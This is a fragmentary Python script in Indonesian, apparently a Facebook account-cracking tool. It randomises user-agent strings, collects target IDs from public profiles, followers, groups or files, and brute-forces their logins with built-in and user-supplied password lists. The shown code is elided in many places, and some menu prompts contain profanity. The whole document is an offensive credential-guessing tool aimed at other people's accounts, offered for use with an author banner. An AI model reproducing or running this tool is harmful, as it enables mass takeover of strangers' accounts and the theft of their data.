...
for xd in range(10000):
	a='Mozilla/5.0 (Linux; Android 9; VKY-L09; HMSCore 6.3.0.331; GMSCore 22.06.18) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.1.302 Mobile Safari/537.36'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Huawei'
	e=random.randrange(100, 9999)
	f='VKY-L09; HMSCore 6.3.0.331; GMSCore 22.06.18) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.1.302 Mobile Safari/537.36'
	...
	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 YaBrowser/19.5.2.38.10 YaApp_iOS/100.00 YaApp_iOS_Browser/100.00 Safari/604.1 SA/3'
...
def banner():
	print(f'''\t{asu}                                              
\x1b[1;91m████████████████████  \x1b[1;97m╔══◍➤ ATHOR: Ndikz
\x1b[1;91m████████████████████  \x1b[1;97m╠══◍➤ STATUS: Prem
\x1b[1;97m████████████████████  \x1b[1;97m╠══◍➤ VERSI: 0.60
\x1b[1;97m████████████████████  \x1b[1;97m╚══◍➤ I LOVE INDONESIA''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def menu(my_name,my_id):
	...
	gh = ' github.com/Muhammad-Andik'
	cetak(nel('\tSelamat Datang [yellow]%s[white] Sayang'%(my_name)))
	print(f'➤ MY ID AKUN : '+str(my_id))
	print(f'➤ IP ADDRESS  : {ip}')
	print(f'➤ GITHUB  : {gh}')
	print('')
	print('\x1b[1;97m├╴➣\x1b[1;97m1. Crack Publik \x1b[1;92m(ON)')
	print('\x1b[1;97m├╴➣\x1b[1;97m2. Crack Follower \x1b[1;92m(ON)')
	print('\x1b[1;97m├╴➣\x1b[1;97m3. Crack Grup \x1b[1;92m(ON)')
	print('\x1b[1;97m├╴➣\x1b[1;97m4. Crack File \x1b[1;92m(ON)')
	print('\x1b[1;97m├╴➣\x1b[1;97m5. Hasil Crack \x1b[1;92m(ON)')
	print('\x1b[1;97m├╴➣0. Keluar       ')
	_____Muhammad__Andik_____ = input('\n>> Pilih : ')
	if _____Muhammad__Andik_____ in ['1']:
		dump_massal()
	elif _____Muhammad__Andik_____ in ['2']:
		dump_follower()
	elif _____Muhammad__Andik_____ in ['3']:
		grup()
	elif _____Muhammad__Andik_____ in ['4']:
		crack_file()
	elif _____Muhammad__Andik_____ in ['5']:
		result()
	elif _____Muhammad__Andik_____ in ['0']:
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('╚══➤  Masukan Jumlah Terget ? : '))
	except ValueError:
	...
	for met in range(jum):
		yz+=1
		kl = input('╚══➤  Masukkan ID Ke 1 '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
	...
	try:
		print('')
		print(f'╚══➤  Total Target Yang Terkumpul{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
...
def grup():
	...
	ua = 'Mozilla/5.0 (Linux; Android 5.1.1; Andromax G36C1G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105'
...
#			id2.insert(xx,bacot)
		...
		exit()
	print('\x1b[1;97m╚══➤ 1. Mobile \x1b[1;92m(ON)')
	print('\x1b[1;97m╚══➤ 2. Mbasic \x1b[1;91m(OF)')
	print('\x1b[1;97m╚══➤ 3. Touch  \x1b[1;91m(OF)')
	print('\x1b[1;97m╚══➤ 4. Mtouch \x1b[1;91m(OF)')
	print('')
	hc = input('>> Pilih : ')
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('')
	_jembot_ = input('\x1b[1;91m➤ Tambahkan Aplikasi ( Y/t ) ')
	if _jembot_ in ['']:
		print('\x1b[1;91m>> Pilih Yang Bener Kontol ')
		back()
	elif _jembot_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	pwplus=input('\x1b[1;91m➤ Tambahkan Password Manual ( Y/t ) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] kakak,ngentod,adik[white] '))
		pwku=input('\x1b[1;91m>> Masukkan Password Tambahan : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'\x1b[1;91m>>>>> {m}•{k}•{h}•{x} Proses Crak Di Mulai Sabar Ya Cuy {m}•{k}•{h}•{x} <<<<< ')
	print('')
